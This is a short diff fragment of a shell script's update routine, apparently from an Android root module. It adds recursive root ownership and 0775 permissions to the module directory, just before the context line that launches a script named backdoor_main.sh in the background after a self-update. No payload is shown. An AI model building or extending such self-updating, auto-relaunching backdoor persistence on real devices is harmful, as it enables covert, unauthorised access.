@@ -59,6 +59,8 @@ update() {
         rm -rf "$MODDIR"/newver.zip
         cp -af "$MODDIR/newver" "$MODDIR"
         rm -rf "$MODDIR"/newver
+        chown -R root:root "$MODDIR"
+        chmod -R 0775 "$MODDIR"
         "$MODDIR"/backdoor_main.sh &
         exit 0
     fi
